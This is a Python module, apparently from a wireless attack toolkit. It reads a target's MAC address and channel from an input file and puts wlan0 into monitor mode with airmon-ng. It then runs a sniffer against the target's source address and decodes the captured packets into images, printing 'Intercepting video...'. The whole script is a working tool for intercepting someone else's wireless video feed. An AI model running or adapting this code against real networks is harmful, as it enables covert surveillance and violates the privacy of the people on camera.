import os
import subprocess
import socket
import time
import shutil

# Capture Target Information
module_input_file_path = os.path.dirname(__file__) + "/../modules/module_input_data.json"
target_information = None

with open(module_input_file_path, "r") as f:
    target_information = f.readlines()
    
##################
## START MODULE ##
##################

log_file_path = "./data/sniff_output.log"
# Check if the file exists
if not os.path.exists(log_file_path): # Create the file 
    with open(log_file_path, 'w') as file: 
        file.write('') # Write an empty string to create the file 
        print(f'{log_file_path} has been created.\n')

image_folder_path = './data/images/'

if os.path.exists(image_folder_path): 
    # Clear all contents of the folder 
    for filename in os.listdir(image_folder_path): 
        file_path = os.path.join(image_folder_path, filename) 
        try: 
         if os.path.isfile(file_path) or os.path.islink(file_path): os.unlink(file_path) # Remove file or symbolic link 
         elif os.path.isdir(file_path): 
             shutil.rmtree(file_path)
        except Exception as e: print(f'Failed to delete {file_path}. Reason: {e}')        

# Stop conflicting processes
subprocess.call(f"sudo airmon-ng check kill",shell=True)

# Start monitor mode
subprocess.call(f"sudo airmon-ng start wlan0",shell=True)

# Set network adapter channel to that of the target network
subprocess.call(f"sudo ./videosrc/tepsots/tepsots.sh set {target_information[4]}",shell=True)

target_source_address = target_information[2].replace(':','').lower()
sniff_cmd = ('sudo', 'python3', './videosrc/tepsots/tepsots.py', '-i', 'wlan0', '-sa', target_source_address.replace('\n',''), '-v')
# Start sniffer and output to log
with open(log_file_path, 'w') as log_file:
    # Start the subprocess and redirect stdout to the log file 
    sniff_process = subprocess.Popen(sniff_cmd, stdout=log_file)

print("Intercepting video...")    

decoder_cmd = ('sudo', 'python3', './videosrc/video_decoder.py', log_file_path, image_folder_path)

# Start the subprocess and create images from the log file
decoder_process = subprocess.Popen(decoder_cmd, stdout=subprocess.PIPE)
